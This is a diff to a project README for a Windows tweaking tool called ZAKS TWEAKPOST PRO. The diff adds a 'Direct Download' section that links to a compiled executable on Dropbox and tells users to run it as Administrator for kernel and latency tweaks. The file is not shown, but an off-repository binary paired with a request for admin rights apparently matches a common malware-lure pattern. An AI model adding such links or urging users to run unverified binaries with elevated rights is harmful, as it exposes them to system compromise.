@@ -55,6 +55,19 @@ Contributions, issues, and feature requests are welcome! Feel free to check the 
 
 ---
 
+---
+
+## 📥 Direct Download
+
+> [!IMPORTANT]
+> Click the button below to download the official compiled executable instantly.
+> 
+> [![Download ZAKS TWEAKPOST PRO](https://shields.io)](https://www.dropbox.com/scl/fo/n1gd6lgy3s65v0fzt7xvj/AIK_ZL6A11MU35kzfUoFdeA?rlkey=ojg3h86igude1l8fjjkhk15ft&st=wedi9dhx&dl=0)
+
+*Note: Always ensure you run the application as an Administrator to successfully apply system kernel and latency tweaks.*
+
+---
+
 ## 📜 License
 
 This project is licensed under the MIT License - see the LICENSE file for details.
